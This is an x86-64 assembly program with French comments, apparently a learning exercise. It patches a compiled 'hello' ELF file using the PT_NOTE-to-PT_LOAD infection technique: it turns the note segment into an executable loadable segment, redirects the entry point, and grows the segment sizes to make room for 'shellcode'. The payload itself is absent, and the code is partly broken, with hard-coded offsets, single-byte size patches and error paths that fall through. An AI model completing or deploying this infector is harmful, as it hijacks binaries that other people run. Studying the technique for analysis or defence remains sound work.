section .data

fichier db 'hello',0 ; ici nous allons travailler sur un fichier en particulier le programme hello world compilé en language C
messageConfirmation db ' Il s agit bien d un fichier ELF',0xA,0
messageRefus db "Il ne s agit pas d un fichier ELF ou  erreur lors de l'ouverture du fichier.", 0xA,0
elfMagic db 0x7F, 'E', 'L', 'F' ; il s'agit de la signature elf


ptNoteOffset1 dq 0x338    ; Premier offset du segment PT_NOTE
ptNoteOffset2 dq 0x368    ; Deuxième offset du segment PT_NOTE ;  j'ai récupéré ces informations en effectuant la commande  readlf -h [nom du elf]

elf_header db 64 dup(0) ; allocation de 64 bits qu'on va utiliser afin de contenir le header.


octet_position equ 456 ;obtenu en effectuant un changement manuel et en comparant les octets avec une copie de hello avec la commande cmp hello hello_copy
flags_position equ 460  ;il s'agit de la position de octet_position auquel on ajoute 4  qui correspond à la postion de p_flags 
octetentry_position equ 24 ; Offset correct pour e_entry (64 bits)
new_flags dd 0x00000001 ;flags d'execution = 1
new_value db 1 ; valeur que va prendre l'octet_position
newentry_adress dq 0x0338 ; adresse virtuelle obtenue en faisant la commande readelf -l mon_elf sur le terminal.


octet_position_p_filesz equ 488 ; dans un fichier elf 64 bits, le p_filesz se trouve à 0x020 octets après le p_type
octet_position_p_memsz equ 496 ; dans un fichier elf 64 bits, le p_memsz se trouve à 40 octets après le p_type.

position dq 488 ; position de p_filesz dans le fichier binaire 
buffer db 0
tailleShellcode dw 0x22
position_memsz dq 496  ; Position pour p_memsz



section .bss
file_descriptor resq 1

p_filesz resb 1
p_memsz resb 1  ; Réserve de l'espace pour p_memsz
section .text
global _start

; début du programme
_start:

mov rax, 2        ; appel système afin d'ouvrir un fichier
lea rdi, [fichier] ; lea récupère l'adresse du fichier et le stocke dans rdi.
mov rsi, 0         ; ouverture en read only
   syscall            ; exécution  du syscall

test rax, rax      ; on vérifie si l'appel système a réussi
js pasUnelf        ; si une erreur survient, on saute à pasUnelf
 mov rdi, rax       ; sauvegarde du descripteur de fichier

  ; lecture des 4 premiers octets : 
mov rax, 0         ; appel système pour lire
mov rsi, buffer    ; on stockera ce qu'on a lu dans buffer
mov rdx, 4         ; lecture de 4 octets
   syscall            ; exécution du syscall

test rax, rax      ; on vérifie si l'appel système a réussi
js pasUnelf        ; si une erreur survient, on saute à pasUnelf

  ; comparaison avec la signature ELF
lea rsi, [elfMagic]  ; on charge l'adresse de la signature elf dans rsi
lea rdi, [buffer]    ; dans rdi on charge celui du buffer, le but étant de comparer les deux
mov rcx, 4           ; compteur pour 4 octets

; cette partie permet de déterminer s'il s'agit bien d'un elf
loopComparaison:
    mov al, byte [rsi]           ; on place un octet de la signature dans al
    cmp al, byte [rdi]           ; on compare avec l'octet de buffer contenant le numéro magique de "hello"
    jne pasUnelf                 ; si la comparaison n'est pas bonne, on "saute" dans la fonction pasUnelf
    inc rsi                      ; ON incrémente de rsi et rdi pour comparer octet par octet les deux refistres
    inc rdi
    loop loopComparaison         ; boucle jusqu'à ce que rcx soit 0

    ; Afficher le message de confirmation
    lea rdi, [messageConfirmation]
    mov rax, 1                   ; appel système write
    mov rdi, 1                   ; descripteur de sortie standard
    lea rsi, [messageConfirmation] ; adresse du message
    mov rdx, 31                  ; taille du message
    syscall                      ; exécution du syscall
    ;jmp exit                     ; on sort du programme


   mov rax, 2
    mov rdi, fichier
    mov rsi, 2          
    syscall
    mov [file_descriptor], rax

    ; Positionner le curseur pour les flags
    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, flags_position
    mov rdx, 0         
    syscall

    ; Écrire les nouveaux flags
    mov rax, 1         
    mov rdi, [file_descriptor]
    mov rsi, new_flags
    mov rdx, 4          
    syscall

    ; Repositionner le curseur pour l'octet à modifier
    mov rax, 8         
    mov rdi, [file_descriptor]
    mov rsi, octet_position
    mov rdx, 0          
    syscall

    ; Écrire le nouvel octet
    mov rax, 1
    mov rdi, [file_descriptor]
    mov rsi, new_value
    mov rdx, 1
    syscall

    ; Modifier e_entry
    mov rax, 8          
    mov rdi, [file_descriptor]
    mov rsi, octetentry_position ; Utiliser l'offset correct
    mov rdx, 0          
    syscall

    mov rax, 1          
    mov rdi, [file_descriptor]
    mov rsi, newentry_adress
    mov rdx, 8          ; 8 octets pour e_entry (64 bits)
    syscall

    

    ; Fermer le fichier
    mov rax, 3
    mov rdi, [file_descriptor]
    syscall

  

    ; Ouvrir le fichier en lecture/écriture
    mov rax, 2
    mov rdi, fichier
    mov rsi, 2  ; O_RDWR
    mov rdx, 0644 ; permissions
    syscall
    mov [file_descriptor], rax

    ; Vérifier si l'ouverture du fichier a réussi
    cmp rax, 0
    jl error

    ; Positionner le curseur pour lire p_filesz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, [position]
    xor rdx, rdx  ; SEEK_SET
    syscall

    ; Lire l'octet pour p_filesz
    mov rax, 0
    mov rdi, [file_descriptor]
    mov rsi, buffer
    mov rdx, 1
    syscall

    ; Additionner buffer et tailleShellcode pour p_filesz
    movzx ax, byte [buffer]
    add ax, [tailleShellcode]
    mov [p_filesz], al  ; p_filesz contient la valeur de p_filesz + la taille du shellcode

    ; Repositionner le curseur pour écrire p_filesz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, [position]
    xor rdx, rdx  ; SEEK_SET
    syscall

    ; Écrire le contenu de p_filesz
    mov rax, 1
    mov rdi, [file_descriptor]
    lea rsi, [p_filesz]
    mov rdx, 1
    syscall

    ; Positionner le curseur pour lire p_memsz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, [position_memsz]
    xor rdx, rdx  ; SEEK_SET
    syscall

    ; Lire l'octet pour p_memsz
    mov rax, 0
    mov rdi, [file_descriptor]
    mov rsi, buffer
    mov rdx, 1
    syscall

    ; Additionner buffer et tailleShellcode pour p_memsz
    movzx ax, byte [buffer]
    add ax, [tailleShellcode]
    mov [p_memsz], al  ; p_memsz contient la valeur de p_memsz + la taille du shellcode

    ; Repositionner le curseur pour écrire p_memsz
    mov rax, 8
    mov rdi, [file_descriptor]
    mov rsi, [position_memsz]
    xor rdx, rdx  ; SEEK_SET
    syscall

    ; Écrire le contenu de p_memsz
    mov rax, 1
    mov rdi, [file_descriptor]
    lea rsi, [p_memsz]
    mov rdx, 1
    syscall

    ; Fermer le fichier
    mov rax, 3
    mov rdi, [file_descriptor]
    syscall



error:
    ; Gestion d'erreur 
    mov rax, 60
    mov rdi, 1  ; Code d'erreur
    syscall



pasUnelf:
    lea rsi, [messageRefus]      ; adresse du message de refus
    mov rax, 1                   ; appel système write
    mov rdi, 1                   ; descripteur de sortie standard
    mov rdx, 31                  ; taille du message
    syscall                      ; exécution du syscall


exit:
    mov rax, 60                  ; appel système exit
    xor rdi, rdi                 ; code de retour 0
    syscall                      ; exécution du syscall




